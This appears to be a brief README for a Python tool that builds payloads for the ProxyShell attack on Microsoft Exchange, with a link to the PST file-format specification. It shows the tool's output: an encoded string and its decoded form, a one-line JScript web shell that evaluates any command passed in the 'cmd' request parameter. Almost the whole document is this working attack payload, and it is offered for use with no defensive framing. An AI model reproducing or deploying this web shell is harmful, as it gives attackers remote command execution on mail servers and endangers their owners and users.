# Py Permutative Encoding
https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd

## Generate proxyshell payload
```
╰─❯ python Proxyshell-payload.py
[+] Encode webshell ⬇
ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ

[+] Decode webshell ⬇
<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
```